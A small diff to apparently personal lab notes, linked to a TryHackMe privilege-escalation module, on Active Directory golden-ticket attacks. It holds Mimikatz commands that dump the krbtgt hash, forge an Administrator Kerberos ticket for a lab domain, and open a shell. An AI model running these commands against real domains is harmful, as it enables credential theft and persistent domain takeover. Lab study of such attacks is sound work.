@@ -244,7 +244,11 @@ Kerberos ticket granting ticket account has to get his hashes dump
 
 `lsadump::lsa /inject /name:krbtgt`
 
-`kerberos::golden /user: /domain: /sid: /krbtgt: /id:`
+`kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<hash> /id:<admin>`
+
+`misc::cmd`
+
+https://tryhackme.com/module/privilege-escalation
 
 
 
